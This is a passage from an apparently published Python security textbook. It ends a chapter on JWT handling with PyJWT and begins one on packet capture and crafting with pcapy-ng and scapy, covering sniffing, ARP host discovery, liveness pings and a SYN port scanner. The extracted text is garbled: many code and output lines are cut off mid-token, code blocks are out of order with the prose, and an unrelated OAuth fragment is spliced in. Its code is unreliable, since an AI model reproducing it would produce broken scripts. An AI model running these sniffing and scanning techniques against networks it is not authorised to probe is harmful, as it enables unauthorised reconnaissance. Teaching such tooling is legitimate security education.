that there is no need to query a database or save the session on the
server. A JSON Web Token oﬀers several advantages over the
traditional cookie authentication and authorization method, so it is
used in the following situations:
REST applications: In REST applications, the JWT guarantees
statelessness by sending the authentication data directly with
the request.
Cross-origin resource sharing: The JWT sends information
using cross-origin resource sharing, which gives it a great
advantage over cookies, which are not usually sent using this
procedure.
Paste the full redirect URL here: https://www.python
{"login":"jmortega","id":4352324,"node_id":"MDQ6VXNl
gists":0,"followers":168,"following":9,"created_at"

Use of many frameworks: When multiple frameworks are used,
authentication data can be shared more easily.
How does a JSON Web Token work?
The user login exempliﬁes the role of the JSON Web Token well.
Before using the JWT, a secret key must be established. Once the
user has successfully entered their credentials, the JWT is returned
with the key and saved locally. The transmission must be done over
HTTPS so that the data is beĴer protected.
In this way, every time the user access protected resources, such as
an API or a protected route, the user agent uses the JWT as a
parameter (for example, jwt for GET requests) or as an
authorization header (for POST, PUT, OPTIONS, and DELETE). The
other party can decrypt the JWT and execute the request if the
veriﬁcation succeeds. A signed JWT consists of three parts, all
Base64-encoded and separated by a period,
HEADER.PAYLOAD.SIGNATURE:
1. Header: The header is made up of two values and provides
important information about the token such as the type of token
and the signature and/or encryption algorithm used. This could
be an example of a JWT header: { "alg": "HS256", "type":
"JWT" }
2. Payload: This consists of an actual JSON object to be encoded.
The payload ﬁeld of the JSON Web Token contains the
information that will be passed to the application. Some
standards are deﬁned here that determine what data is

transmiĴed. The information is provided as key/value pairs
where the keys are called claims in JWT.
3. Signature: This veriﬁes the message wasn’t changed along the
way by using the secret key shared between parties. The
signature of a JSON Web Token is created using the Base64
encoding of the header and payload, as well as the speciﬁed
signing or encryption method. The structure is deﬁned by JSON
Web Signature (JWS), a standard established in RFC 7515. For
the signature to be eﬀective, it is necessary to use a secret key
that only the original application knows. On the one hand, the
signature veriﬁes that the message has not been modiﬁed and,
on the other hand, if the token is signed with a private key, it
also guarantees that the sender of the JWT is the correct one.
Working with PyJWT
PyJWT is a Python library that allows us to encode and decode data
using the JWT standard. You can ﬁnd the full documentation in the
following URL:
https://pyjwt.readthedocs.io/en/latest/installation.htm
l
Since the module is in the Python repository, the installation can be
done with the following command:
$ pip install pyjwt 
This module provides encode() and decode() functions, which
oﬀer the possibility of reporting the hash algorithm whose default

value is HS256. In the following instructions, we are using these
methods to generate the token from the data and the process of
geĴing the original data from the token.
It is an essential requirement to use the same secret_key in both
functions so that the algorithm returns the original data. If the
secret_key is diﬀerent from the original, it returns an error
message indicating that the signature veriﬁcation has failed.
In the following example, we see how to encode and decode an
object encoded as JSON. To encode this object, we use the encode()
method, which receives the payload, the secret key that we have
conﬁgured, and the algorithm as parameters. For the decoding
process, the decode() method is used, which has as parameters the
>>> import jwt 
>>> data={"data":"my_data"} 
>>> token512 = jwt.encode(data, 'secret_key', algori
>>> token512 
'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJkYXRhIjoibX
>>> output = jwt.decode(token512, 'secret_key', algo
>>> output 
{'data': 'my_data'} 
>>> output = jwt.decode(token512, 'other_secret_key
Traceback (most recent call last): 
raise InvalidSignatureError("Signature verification 
jwt.exceptions.InvalidSignatureError: Signature veri

token obtained in the encoding process, the secret key, and the
algorithm. You can ﬁnd the following code in the
pyjwt_encode_decode.py ﬁle inside the pyjwt folder:
When executing the previous script, we see how we obtain the token
from the data encoded in JSON format. Later, we apply the decoding
to obtain the original data from the token and the secret key.
import datetime 
import jwt 
SECRET_KEY = "python_jwt" 
json_data = { 
    "sender": "Python JWT", 
    "message": "Testing Python JWT", 
    "date": str(datetime.datetime.now()), 
} 
encoded_token = jwt.encode(payload=json_data, key=SE
print("Token:",encoded_token) 
try: 
    decode_data = jwt.decode(jwt=encoded_token, key=
    print("Decoded data:",decode_data) 
except Exception as e: 
    message = f"Token is invalid --> {e}" 
    print({"message": message}) 
$ python pyjwt_encode_decode.py  
Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzZW5k
Decoded data: {'sender': 'Python JWT', 'message': 'T

In the previous script, we used the same key to decode the generated
token with the HS256 algorithm. If you want to make this token
invalidate, you can append another ﬁeld called exp with the time
expiration established with a date prior to the execution date.
If the token is valid, then we get the correct JSON object, else the
Python interpreter throws an exception saying Token is invalid.
Summary
In this chapter, we looked at the urllib.request, requests,
requests-oauthlib, and pyjwt modules for building HTTP
clients and implementing authentication. The requests module is a
very useful tool if we want to consume API endpoints from our
Python application. In the last section, we reviewed the main
authentication mechanisms and how to implement them with the
requests module.
json_data = { 
    "sender": "Python JWT", 
    "message": "Testing Python JWT", 
    "date": str(datetime.datetime.now()), 
    "exp": datetime.datetime.utcnow() - datetime.tim
} 
Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzZW5k
{'message': 'Token is invalid --> Signature has expi

In the next chapter, we will explore network programming packages
in Python to analyze network traﬃc using the pcapy and scapy
modules.
Questions
As we conclude, here is a list of questions for you to test your
knowledge regarding this chapter’s material. You will ﬁnd the
answers in the Assessments section of the Appendix:
1. How can we realize a POST request with the requests and
urllib modules by passing a dictionary-type data structure
that would be sent to the request body?
2. How can we access request and response headers using the
requests module?
3. What are the main roles that provide the OAuth 2.0 protocol in
the authorization process?
4. Which mechanism is used to improve the basic authentication
process by using a one-way hashing cryptographic algorithm?
5. Which header is used to identify the browser and operating
system that we are using to send requests to a URL?
Further reading
In the following links, you can ﬁnd more information about the tools
and the oﬃcial Python documentation for some of the modules
we’ve referred to:
urllib.request documentation:
https://docs.python.org/3/library/urllib.request.ht

ml
requests documentation: https://requests.readthedocs.io
requests-oauthlib documentation: https://requests-
oauthlib.readthedocs.io
pyjwt documentation: https://pyjwt.readthedocs.io
Join our community on Discord
Join our community’s Discord space for discussions with the author
and other readers:
https://packt.link/SecNet

5
Analyzing Network Traffic and
Packet Sniffing
This chapter will introduce you to some of the basics of analyzing
network traﬃc using the pcapy-ng and scapy modules in Python.
These modules provide you with the ability to write small Python
scripts that can understand network traﬃc. Scapy is a network
packet manipulation tool wriĴen in Python that can forge or decode
packets, forward packets, capture packets, and match requests and
responses.
The following topics will be covered in this chapter:
Understanding the pcapy-ng module to capture and inject
packets on the network.
Exploring the scapy module to capture, analyze, manipulate
and inject network packets.
Implementing the scapy module for network port scanning.
Using the scapy module to read a pcap ﬁle.
Understanding the scapy module for packet sniﬃng.
Working with scapy to detect ARP spooﬁng aĴacks.
Technical requirements

To get the most out of this chapter, you will need to install a Python
distribution on your local machine and have some basic knowledge
about packets, capturing, and sniﬃng networks with tools such as
Wireshark. It is also recommended to use a Unix distribution to
facilitate the installation and use of the scapy module. We will work
with Python version 3.10, available at
https://www.python.org/downloads.
The examples and source code for this chapter are available in the
GitHub repository at
https://github.com/PacktPublishing/Python-for-Security-
and-Networking.
Check out the following video to see the Code in Action:
https://packt.link/Chapter05.
Capturing and injecting packets
with pcapy-ng
In this section, you will learn the basics of pcapy-ng and how to
capture and read headers from packets. pcapy-ng is a Python
module that enables Python scripts to capture packets on the
network, and it is highly eﬀective when used in conjunction with
other collections of Python classes for constructing and packet
handling. You can download the source code and the latest stable
and development version at
https://github.com/stamparm/pcapy-ng.
To install pcapy-ng on your operating system, you can use the
following command:

Capturing packets with pcapy-ng
The pcapy-ng module provides open_live() to capture packets
from a speciﬁc interface and we can specify the number of bytes per
capture and other parameters such as promiscuous mode and
timeout. In the following example, we use the findalldevs()
method to get all the interfaces of your machine and we obtain the
captured bytes using the selected interface. You can ﬁnd the
following code in the pcapy_capturing_packets.py ﬁle inside the
pcapy folder:
$ pip install pcapy-ng 
Collecting pcapy-ng 
  Downloading pcapy-ng-1.0.9.tar.gz (38 kB) 
Building wheels for collected packages: pcapy-ng 
  Building wheel for pcapy-ng (setup.py) ... done 
  Created wheel for pcapy-ng: filename=pcapy_ng-1.0
  Stored in directory: /root/.cache/pip/wheels/27/de
Successfully built pcapy-ng 
Installing collected packages: pcapy-ng 
Successfully installed pcapy-ng-1.0.9 
import pcapy 
import datetime 
interfaces = pcapy.findalldevs() 
print("Available interfaces are :") 
for interface in interfaces: 
    print(interface) 

You can select a network interface of interest from the previous list.
Invoke the script again, this time using sudo privileges and we will
see the bytes captured on the interface in real time:
$ sudo python pcapy_capturing_packets.py  
Available interfaces are: 
wlo1 
any 
lo 
.... 
Enter interface name to sniff: wlo1 
Sniffing interface wlo1 
2022-12-03 17:39:09.033355: captured 412 bytes 
2022-12-03 17:39:09.033435: captured 432 bytes 
2022-12-03 17:39:09.033492: captured 131 bytes 
... 
Note that we will usually need to execute the
commands with sudo since access to the interfaces
requires system administrator access.
interface = input("Enter interface name to sniff : "
print("Sniffing interface " + interface) 
cap = pcapy.open_live(interface, 65536 , 1 , 0) 
while True: 
    (header, payload) = cap.next() 
    print ('%s: captured %d bytes' %(datetime.dateti

Reading headers from packets
In the following example, we capture packets from a speciﬁc device
(wlo1), and for each packet, we obtain the header and payload to
extract information about MAC addresses, IP headers, and protocol.
You can ﬁnd the following code in the pcapy_reading_headers.py
ﬁle inside the pcapy folder:
import pcapy 
from struct import * 
interfaces = pcapy.findalldevs() 
print("Available interfaces are :") 
for interface in interfaces:  
    print(interface) 
 
interface = input("Enter interface name to sniff : "
cap = pcapy.open_live(interface, 65536, 1, 0) 
while True: 
    (header,payload) = cap.next() 
    l2hdr = payload[:14] 
    l2data = unpack("!6s6sH", l2hdr) 
    srcmac = "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x" % (l2hd
    dstmac = "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x" % (l2hd
    print("Source MAC: ", srcmac, " Destination MAC
    # get IP header from bytes 14 to 34 in payload 
    ipheader = unpack('!BBHHHBBH4s4s' , payload[14:3
    timetolive = ipheader[5] 
    protocol = ipheader[6] 
    print("Protocol ", str(protocol), " Time To Live

When executing the previous script, it returns the MAC addresses
and the time to live for each of the captured packets.
Reading pcap files with pcapy-ng
In the packet capture process, it is common to ﬁnd ﬁles with the
.pcap extension. This ﬁle contains frames and network packets and
is very useful if we need to save the result of a network analysis for
$ sudo python pcapy_reading_headers.py  
Available interfaces are : 
wlo1 
any 
lo 
enp0s25 
docker0 
br-9ab711bca770 
bluetooth0 
bluetooth-monitor 
nflog 
nfqueue 
dbus-system 
dbus-session 
Enter interface name to sniff :wol1 
Source MAC:  a4:4e:31:d8:c2:80  Destination MAC:  f4
Protocol  6  Time To Live:  234 
Source MAC:  f4:1d:6b:dd:14:d0  Destination MAC:  a4
Protocol  6  Time To Live:  64 
….. 

later processing. The information stored in a .pcap ﬁle can be
analyzed as many times as we need without the original ﬁle being
altered.
With the open_offline() function, we can read a pcap ﬁle and get
a list of packages that can be handled directly from Python. You can
ﬁnd the following code in the pcapy_read_pcap.py ﬁle inside the
pcapy folder:
In the code above, we read the ﬁrst 500 packets in the
packets.pcap capture included in the pcapy folder. For each
import pcapy 
from struct import * 
pcap_file = pcapy.open_offline("packets.pcap") 
count = 1
while count<500: 
    print("Packet #: ", count) 
    count = count + 1 
    (header,payload) = pcap_file.next() 
    l2hdr = payload[:14] 
    l2data = unpack("!6s6sH", l2hdr) 
    srcmac = "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x" % (l2hd
    dstmac = "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x" % (l2hd
    print("Source MAC: ", srcmac, " Destination MAC
    ipheader = unpack('!BBHHHBBH4s4s' , payload[14:3
    timetolive = ipheader[5] 
    protocol = ipheader[6] 
    print("Protocol ", str(protocol), " Time To Live
    count = count + 1

packet, we obtain the source and destination MAC addresses, as well
as the protocol and packet’s Time to Live(TTL).
Capturing and injecting packets
with scapy
The analysis of network traﬃc, which are the packets that are
exchanged between two hosts that can be intercepted, could help us
identify the details when we know the details of the systems that
participate in the communication. The message and the duration of
the communication are some of the valuable information that an
aĴacker who is listening in the network medium can obtain.
Introduction to scapy
Scapy is a module wriĴen in Python to manipulate data packages
with support for multiple network protocols. It allows the creation
and modiﬁcation of network packets of various types, implements
functions to passively capture and sniﬀ packets, and then executes
actions on these packets. I recommend using scapy on a Linux
system, as it was designed with Linux in mind.
The newest version of scapy does support Windows, but for the
purpose of this chapter, I assume you are using a Linux distribution
that has a fully functioning scapy installation. To install scapy, you
can follow the instructions at https://scapy.net and execute the
following command:

When you install scapy on your operating system, you can access its
Command-Line Interface (CLI) as follows:
$ scapy 
$ sudo pip install scapy 
Collecting scapy 
  Downloading scapy-2.4.5.tar.gz (1.1 MB) 
     |████████████████████████████████| 1.1 MB 4.6 M
Building wheels for collected packages: scapy 
  Building wheel for scapy (setup.py) ... done 
  Created wheel for scapy: filename=scapy-2.4.5-py2
  Stored in directory: /root/.cache/pip/wheels/85/7a
Successfully built scapy 
Installing collected packages: scapy 
Successfully installed scapy-2.4.5 

Figure 5.1: Accessing the scapy CLI
Scapy commands
Scapy provides us with many commands to investigate a network.
We can use scapy in two ways: interactively within a terminal
window or programmatically from a Python script by importing it
as a library. The main functions that we can use to get the layers and
functions available within scapy are:
ls(): List of available layers.
explore() : Graphical interface to visualize existing layers.
lsc(): Available functions.
send(): Sends packets to level 2.
sendp(): Sends packets to level 3.

sr(): Sends and receives packets at level 3.
srp(): Sends and receives packets at level 2.
sr1(): Sends and receives only the ﬁrst packet at level 3.
srp1(): Sends and receives only the ﬁrst packet at level 2.
sniﬀ(): Packet sniﬃng.
traceroute(): Traceroute command.
arping(): Sending ‘who-has’ ARP requests to determine which
hosts are up on the network.
Scapy supports more than 300 network protocols. We can obtain the
protocol list supported by scapy using the ls() command:
>>> ls() 
AH         : AH 
AKMSuite   : AKM suite 
ARP        : ARP 
ASN1P_INTEGER : None 
ASN1P_OID  : None 
ASN1P_PRIVSEQ : None 
ASN1_Packet : None 
ATT_Error_Response : Error Response 
ATT_Exchange_MTU_Request : Exchange MTU Request 
ATT_Exchange_MTU_Response : Exchange MTU Response 
ATT_Execute_Write_Request : Execute Write Request 
ATT_Execute_Write_Response : Execute Write Response 
ATT_Find_By_Type_Value_Request : Find By Type Value 
…...... 

With the previous command, we can see the parameters that can be
sent in a certain layer. In parentheses, we can indicate the layer on
which we want more information. The following shows an execution
of the ls() command with diﬀerent parameters, where we can see
ﬁelds supported by IP, ICMP and TCP protocols:
>>> ls(IP) 
version    : BitField  (4 bits)                  = (
ihl        : BitField  (4 bits)                  = (
tos        : XByteField                          = (
len        : ShortField                          = (
id         : ShortField                          = (
flags      : FlagsField                          = (
frag       : BitField  (13 bits)                 = (
ttl        : ByteField                           = (
proto      : ByteEnumField                       = (
chksum     : XShortField                         = (
src        : SourceIPField                       = (
dst        : DestIPField                         = (
options    : PacketListField                     = (
>>> ls(ICMP) 
type       : ByteEnumField                       = (
code       : MultiEnumField (Depends on 8)       = (
chksum     : XShortField                         = (
id         : XShortField (Cond)                  = (
seq        : XShortField (Cond)                  = (
ts_ori     : ICMPTimeStampField (Cond)           = (
ts_rx      : ICMPTimeStampField (Cond)           = (
ts_tx      : ICMPTimeStampField (Cond)           = (
gw         : IPField (Cond)                      = (

Also, you can see the functions available in scapy with the lsc()
command:
ptr        : ByteField (Cond)                    = (
reserved   : ByteField (Cond)                    = (
length     : ByteField (Cond)                    = (
addr_mask  : IPField (Cond)                      = (
nexthopmtu : ShortField (Cond)                   = (
unused     : MultipleTypeField (ShortField, IntField
>>> ls(TCP) 
sport      : ShortEnumField                      = (
dport      : ShortEnumField                      = (
seq        : IntField                            = (
ack        : IntField                            = (
dataofs    : BitField  (4 bits)                  = (
reserved   : BitField  (3 bits)                  = (
flags      : FlagsField                          = (
window     : ShortField                          = (
chksum     : XShortField                         = (
urgptr     : ShortField                          = (
options    : TCPOptionsField                     = (
>>> lsc() 
IPID_count          : Identify IP id values classes 
arpcachepoison      : Poison target's cache with (yo
arping              : Send ARP who-has requests to d
arpleak             : Exploit ARP leak flaws, like N
bind_layers         : Bind 2 layers on some specific
bridge_and_sniff    : Forward traffic between interf

Scapy helps us to create custom packets in any of the layers of the
TCP/IP protocol. The packages are created by layers starting from
the lowest layer at the physical level (Ethernet) until we reach the
application layer. In the following diagram, we can see the structure
scapy manages by layer.
Figure 5.2: TCP/IP protocol layers
In scapy, a layer usually represents a protocol. Network protocols
are structured in stacks, where each step consists of a layer or
protocol. A network packet consists of multiple layers, and each
layer is responsible for part of the communication.
A packet in scapy is a set of structured data ready to be sent to a
network. Packets must follow a logical structure, according to the
type of communication you want to simulate. That means if you
want to send a TCP/IP packet, you must follow the protocol rules
deﬁned in the TCP/IP standard.
By default, the IP layer is conﬁgured as the destination IP of the
localhost address at 127.0.0.1, which refers to the local machine
where scapy is executed. We could run scapy from the command
line to check our localhost address:
chexdump            : Build a per-byte hexadecimal r
computeNIGroupAddr  : Compute the NI group Address. 

>>> ip =IP() 
>>> ip.show() 
###[ IP ]###  
  version   = 4 
  ihl       = None 
  tos       = 0x0 
  len       = None 
  id        = 1 
  flags     =  
  frag      = 0 
  ttl       = 64 
  proto     = hopopt 
  chksum    = None 
  src       = 127.0.0.1 
  dst       = 127.0.0.1 
  \options   \ 
If we want the packet to be sent to another IP or domain, we will
have to conﬁgure the IP layer. The following command will create a
packet in the IP and ICMP layers:
>>> icmp_packet=IP(dst='www.python.org')/ICMP() 
Also, we have available some methods like show() and show2(),
which allow us to see the information of the detail of a speciﬁc
packet:
>>> icmp_packet.show() 
###[ IP ]###  

  version   = 4 
  ihl       = None 
  tos       = 0x0 
  len       = None 
  id        = 1 
  flags     =  
  frag      = 0 
  ttl       = 64 
  proto     = icmp 
  chksum    = None 
  src       = 192.168.18.21 
  dst       = Net("www.python.org/32") 
  \options   \ 
###[ ICMP ]###  
     type      = echo-request 
     code      = 0 
     chksum    = None 
     id        = 0x0 
     seq       = 0x0 
     unused    = '' 
 >>> icmp_packet.show2() 
###[ IP ]###  
  version   = 4 
  ihl       = 5 
  tos       = 0x0 
  len       = 28 
  id        = 1 
  flags     =  
  frag      = 0 
  ttl       = 64 
  proto     = icmp 
  chksum    = 0x8bde 

  src       = 192.168.18.21 
  dst       = 151.101.132.223 
  \options   \ 
###[ ICMP ]###  
     type      = echo-request 
     code      = 0 
     chksum    = 0xf7ff 
     id        = 0x0 
     seq       = 0x0 
     unused    = '' 
With the following command, we can see the structure of a
particular packet:
>>> ls(icmp_packet) 
version    : BitField  (4 bits)                  = 4
ihl        : BitField  (4 bits)                  = N
tos        : XByteField                          = 0
len        : ShortField                          = N
id         : ShortField                          = 1
flags      : FlagsField                          = <
frag       : BitField  (13 bits)                 = 0
ttl        : ByteField                           = 6
proto      : ByteEnumField                       = 1
chksum     : XShortField                         = N
src        : SourceIPField                       = 
dst        : DestIPField                         = N
options    : PacketListField                     = 

Scapy creates and analyses packets layer by layer. The packets in
scapy are Python dictionaries, so each packet is a set of nested
dictionaries, and each layer is a child dictionary of the main layer.
The summary() method will provide the details of the layers of each
package:
Also, we can create a packet over other layers like IP/TCP:
>>> icmp_packet[0].summary() 
'IP / ICMP 192.168.18.21 > Net("www.python.org/32") 
>>> icmp_packet[1].summary() 
'ICMP 192.168.18.21 > Net("www.python.org/32") echo-
>>> tcp_packet=IP(dst='python.org')/TCP(dport=80) 
>>> tcp_packet.show() 
###[ IP ]###  
  version   = 4 
  ihl       = None 
  tos       = 0x0 
  len       = None 
  id        = 1 
  flags     =  
  frag      = 0 
  ttl       = 64 
  proto     = tcp 
  chksum    = None 
  src       = 192.168.18.21 
  dst       = Net("python.org/32") 
  \options   \ 

###[ TCP ]###  
     sport     = ftp_data 
     dport     = www_http 
     seq       = 0 
     ack       = 0 
     dataofs   = None 
     reserved  = 0 
     flags     = S 
     window    = 8192 
     chksum    = None 
     urgptr    = 0 
     options   = '' 
 >>> tcp_packet.show2() 
###[ IP ]###  
  version   = 4 
  ihl       = 5 
  tos       = 0x0 
  len       = 40 
  id        = 1 
  flags     =  
  frag      = 0 
  ttl       = 64 
  proto     = tcp 
  chksum    = 0xdd5b 
  src       = 192.168.18.21 
  dst       = 138.197.63.241 
  \options   \ 
###[ TCP ]###  
     sport     = ftp_data 
     dport     = www_http 
     seq       = 0 
     ack       = 0 

Sending packets with scapy
To send a packet in scapy, we have available two methods:
send(): Work with packet at layer 3
sendp(): Work with packets at layer 2
If we need to control the packets at layer 3 or the IP, we could use
send() to send packets. If we need to control the packets at layer 2
(Ethernet), we could use sendp(). We can use the help() method
on these two functions in the module scapy.sendrecv to get
parameter information:
     dataofs   = 5 
     reserved  = 0 
     flags     = S 
     window    = 8192 
     chksum    = 0xf20a 
     urgptr    = 0 
     options   = '' 
 >>> tcp_packet.summary() 
'IP / TCP 192.168.18.21:ftp_data > Net("python.org/3
>>> help(send)  
send(x, iface=None, **kargs) 
    Send packets at layer 3 
    :param x: the packets 
    :param inter: time (in s) between two packets (d
    :param loop: send packet indefinetly (default 0)
    :param count: number of packets to send (default

With the send() method, we can send a speciﬁc packet in layer-3 as
follows:
>> send(packet) 
To send a layer-2 packet, we can use the sendp() method. To use
this method, we need to add an Ethernet layer and provide the
correct interface to send the packet:
As we saw before, these methods provide some parameters. For
example, with the inter and loop options, we can send the packet
indeﬁnitely every N seconds:
>>> sendp(packet, loop=1, inter=1) 
    :param verbose: verbose mode (default None=conf
    :param realtime: check that a packet was sent be
    :param return_packets: return the sent packets 
    :param socket: the socket to use (default is con
    :param iface: the interface to send the packets 
    :param monitor: (not on linux) send in monitor m
    :returns: None 
>>> help(sendp) 
sendp(x, iface=None, iface_hint=None, socket=None, *
    Send packets at layer 2 
>>> sendp(Ether()/IP(dst="packtpub.com")/ICMP()/"Lay

The sendp() and send() methods work in a similar way; the
diﬀerence is that sendp() works in layer 2. This means that system
routes are not necessary, and the information will be sent directly
through the network adapter indicated as a parameter of the
function.
The information will be sent although there is apparently no
communication through any system route. This function also allows
us to specify the MAC addresses of the destination. If we indicate
the MAC addresses, scapy will try to resolve them automatically
with both local and remote addresses.
In the following command, we generate a packet with the Ethernet,
IP, and ICMP layers. Thanks to the Ether layer, we can obtain the
source and destination MAC addresses of this packet:
>>> packet = Ether()/IP(dst="python.org")/ICMP() 
>>> packet.show() 
###[ Ethernet ]###  
  dst       = f4:1d:6b:dd:14:d0 
  src       = a4:4e:31:d8:c2:80 
  type      = IPv4 
We could also execute these operations from a Python script. In the
following example, we create an ICMP packet to send to the domain
python.org. You can ﬁnd the following code in the
scapy_icmp_python.py ﬁle inside the scapy folder.
from scapy.all import * 
packet=IP(dst='www.python.org')/ICMP() 

packet.show() 
sendp(packet) 
The send() and sendp() methods allow us to send the information
we need to the network, but they do not allow us to receive the
answers. There are many ways to receive responses from the packets
we generate, but the most useful is using the sr family methods
(derived from the acronym: send and receive). The family of
methods for the sent and received packets include the following:
sr (...): Sends and receives a packet, or a list of packages to the
network. It waits until a response has been received for all sent
packets. It is important to note this function works in layer 3. In
other words, to know how to send the packages, use the
system’s routes. If there is no route to send the packet(s) to the
desired destination, it cannot be sent.
sr1 (...): It works the same as the sr (...) methods except that
it only captures the ﬁrst response received and ignores any
others.
srp (...): It works the same as the sr (...) method but in layer
2. It allows us to send information through a speciﬁc interface.
The information will always be sent, even if there is no route for
it.
srp1 (...): Its operation is identical to the sr1 (...) method but
it works in layer 2.
srbt (...): Sends information through a Bluetooth connection.
srloop (...): Allow us to send and receive information N times.
That means we can send one packet three times and, therefore,
we will receive the response to the three packets, in consecutive

order. It also allows us to specify the actions to be taken when a
packet is received and when no response is received.
srploop (...): The same as srloop but works in layer 2.
If we want to send and receive packets with the possibility to see the
response packet, the sr1() method can be useful. In the following
example, we build an ICMP packet and send it with sr1():
The previous packet is the response to a TCP connection from the
Python domain, where we can see that it has two layers (IP and
ICMP). In a similar way, we can work with scapy from the Python
script. The following script allows us to connect with the Python
domain, generating one packet with three layers.
You can ﬁnd the following code in the scapy_send_receive.py ﬁle
inside the scapy folder.
>>> packet=IP(dst='www.python.org')/ICMP() 
>>> sr1(packet) 
Begin emission: 
Finished sending 1 packets. 
.* 
Received 2 packets, got 1 answers, remaining 0 packe
<IP  version=4 ihl=5 tos=0x0 len=28 id=52517 flags= 
from scapy.all import * 
packet=Ether()/IP(dst='www.python.org')/TCP(dport=80
packet.show() 
srp1(packet, timeout=10) 

Another interesting use of the srp() method together with the
Ether and ARP layers is to get the active hosts on a network segment.
For example, to scan the hosts in our subnet, it would be enough to
execute the srp() method and display the values of the active hosts:
Another interesting feature is the ability to perform DNS queries to
obtain domain name servers. In the following example, we build a
packet with the IP, UDP and DNS layers with the domain name to
be consulted. Later, we send this packet and obtain the response
packet. You can ﬁnd the following code in the
scapy_query_dns.py ﬁle inside the scapy folder:
>>> answer,unanswer = srp(Ether(dst="ff:ff:ff:ff:ff"
Begin emission: 
Finished sending 256 packets. 
*.*................................................
Received 70 packets, got 2 answers, remaining 254 pa
>>> answer.summary() 
Ether / ARP who has 192.168.18.1 says 192.168.18.21 
Ether / ARP who has 192.168.18.44 says 192.168.18.21
from scapy.all import * 
def queryDNS(dnsServer,dominio): 
    packet_dns= IP(dst=dnsServer)/UDP(dport=53)/DNS(
    response_packet = sr1(packet_dns,verbose=1) 
    print(response_packet.show()) 
    return response_packet[DNS].summary() 

In the previous, code we can see the structure of the DNS query
packet, which is a UDP packet over port 53 and the given
nameserver and domain. Running the previous script, we can see the
nameserver for the domain www.python.org.
if __name__ == "__main__": 
    print (queryDNS("8.8.8.8","www.python.org")) 
$ sudo python scapy_query_dns.py 
Begin emission: 
Finished sending 1 packets. 
Received 2 packets, got 1 answers, remaining 0 packe
###[ IP ]###  
  version   = 4 
  ihl       = 5 
  tos       = 0x0 
  len       = 121 
  id        = 57690 
  flags     =  
  frag      = 0 
  ttl       = 122 
  proto     = udp 
  chksum    = 0x7bd2 
  src       = 8.8.8.8 
  dst       = 192.168.18.143 
  \options   \ 
###[ UDP ]###  
     sport     = domain 
     dport     = domain 
     len       = 101 

     chksum    = 0xbde9 
###[ DNS ]###  
        id        = 0 
        qr        = 1 
        opcode    = QUERY 
        aa        = 0 
        tc        = 0 
        rd        = 1 
        ra        = 1 
        z         = 0 
        ad        = 0 
        cd        = 0 
        rcode     = ok 
        qdcount   = 1 
        ancount   = 2 
        nscount   = 0 
        arcount   = 0 
        \qd        \ 
         |###[ DNS Question Record ]###  
         |  qname     = 'www.python.org.' 
         |  qtype     = A 
         |  qclass    = IN 
        \an        \ 
         |###[ DNS Resource Record ]###  
         |  rrname    = 'www.python.org.' 
         |  type      = CNAME 
         |  rclass    = IN 
         |  ttl       = 21572 
         |  rdlen     = None 
         |  rdata     = 'dualstack.python.map.fastly
         |###[ DNS Resource Record ]###  
         |  rrname    = 'dualstack.python.map.fastly
|

Network discovery with scapy
There are diﬀerent methods to check live hosts inside a network. For
example, with the following command, we can create a ICMP packet
over the IP layer and send this packet over the network using the
sr1() method:
We can see the results of the reply using the display() method and
the test_icmp variable:
>>> test_icmp.display() 
###[ IP ]###  
         |  type      = A 
         |  rclass    = IN 
         |  ttl       = 2 
         |  rdlen     = None 
         |  rdata     = 151.101.132.223 
        ns        = None 
        ar        = None 
None 
DNS Ans "b'dualstack.python.map.fastly.net.'" 
>>> test_icmp = sr1(IP(dst="45.33.32.156")/ICMP()) 
Begin emission: 
Finished sending 1 packets. 
.* 
Received 2 packets, got 1 answers, remaining 0 packe

  version   = 4 
  ihl       = 5 
  tos       = 0x28 
  len       = 28 
  id        = 62692 
  flags     =  
  frag      = 0 
  ttl       = 44 
  proto     = icmp 
  chksum    = 0x795a 
  src       = 45.33.32.156 
  dst       = 192.168.18.21 
  \options   \ 
###[ ICMP ]###  
     type      = echo-reply 
     code      = 0 
     chksum    = 0x0 
     id        = 0x0 
     seq       = 0x0 
     unused    = '' 
With the following script, we can check if a host is live or not. You
can ﬁnd the following code in the scapy_icmp_target.py ﬁle
inside the scapy folder:
import sys 
from scapy.all import * 
target = sys.argv[1] 
icmp = IP(dst=target)/ICMP() 
recv = sr1(icmp,timeout=10) 

if recv is not None: 
    print("Target IP is live") 
When executing the previous script, we can see in the output
information about received packets.
Another method we can use to check live hosts for internal and
external networks is the TCP SYN ping method. You can ﬁnd the
following code in the scapy_tcp_target.py ﬁle inside the scapy
folder:
In the previous script, we use the sr() method to send a packet and
receive a response:
$ sudo python scapy_icmp_target.py 45.33.32.156 
Begin emission: 
Finished sending 1 packets. 
...................................................
Received 60 packets, got 1 answers, remaining 0 pack
Target IP is live 
from scapy.all import * 
target = sys.argv[1] 
port = int(sys.argv[2]) 
ans,unans = sr(IP(dst=target)/TCP(dport=port,flags="
ans.summary() 

When executing the script above, we can target the IP and metadata
since we received a response conﬁrmation packet.
Port scanning and traceroute with
scapy
In the same way we do port-scanning with tools like nmap, we can
also execute a simple port scanner that tells us if a speciﬁc host and
ports, are open, closed or ﬁltered with scapy.
Port scanning with scapy
In the following example, we deﬁne the analyze_port() method,
which provides the host, port, and verbose_level parameters.
This method is responsible for sending a TCP packet and waiting for
its response. When processing the response, the objective is to check
within the TCP layer if the received ﬂag corresponds to a port in an
open, closed, or ﬁltered state. You can ﬁnd the following code in the
scapy_port_scan.py ﬁle inside the scapy's port_scanning
folder:
$ sudo python scapy_tcp_target.py 45.33.32.156 80 
Begin emission: 
Finished sending 1 packets. 
...............* 
Received 16 packets, got 1 answers, remaining 0 pack
IP / TCP 192.168.18.21:ftp_data > 45.33.32.156:www_h

In our main program, we manage the parameters related to the hos
and port range and another parameter that indicates the debug level:
import sys  
from scapy.all import * 
import logging 
logging.getLogger("scapy.runtime").setLevel(logging
def analyze_port(host, port, verbose_level): 
    print("[+] Scanning port %s" % port) 
    packet = IP(dst=host)/TCP(dport=port,flags="S") 
    response = sr1(packet,timeout=0.5,verbose=verbos
    if response is not None and response.haslayer(TC
        if response[TCP].flags == 18: 
            print("Port "+str(port)+" is open!") 
            sr(IP(dst=target)/TCP(dport=response.spo
